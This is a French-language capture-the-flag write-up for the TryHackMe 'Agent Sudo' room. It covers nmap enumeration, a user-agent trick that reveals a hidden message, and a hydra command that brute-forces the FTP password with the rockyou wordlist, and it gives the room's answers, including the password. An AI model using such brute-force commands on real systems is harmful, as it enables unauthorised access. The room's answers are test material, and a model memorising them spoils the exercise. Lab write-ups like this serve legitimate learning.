# THM - Agent Sudo
<p align="center">
  <img width="300" height="300" src="logo.png">
</p>

Description | Difficulté | Lien
-------------|------------|-----
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. | Easy 🟢| [THM](https://tryhackme.com/room/agentsudoctf)

Enumeration de port :
```txt
nmap -A <ip>
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 05:12 EDT
Nmap scan report for 10.10.21.237
Host is up (0.040s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds
```

Il y a 3 ports ouverts, le port 21 qui héberge un FTP, le port 22 pour le SSH et le port 80 avec un serveur Web.

> **Note**
> Première question : How many open ports ? ``3``

Sur la page d'accueil du site, il y a le message suivant :
```
Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
```
Il peut être déduis de ce message qu'il nous faut renseigner un user-agent différents pour afficher de nouvelles informations. L'user-agent doit correspondre à un nom de code. En regardant la signature de l'agent on remarque qu'il se nomme "Agent R" donc son nom de code est R.

> **Note** 
> Deuxième question : How you redirect yourself to a secret page ? ``user-agent``

En essayer les 26 lettres de l'alphabet avec l'aide du plugin [User-Agent Switcher](https://mybrowseraddon.com/useragent-switcher.html), il y a un nouveau message qui apparait avec l'user-agent "C".

Le message est le suivant :
```txt
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
From,
Agent R
```

> **Note** 
> Troisième question : What is the agent name ? ``chris``

Le message indique que le mot de passe de Chris est faible. Il faut donc le brute force, à l'aide de la commande suivante :
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<ip>
```

> **Note**
> Quatrième question : FTP password ``crystal``

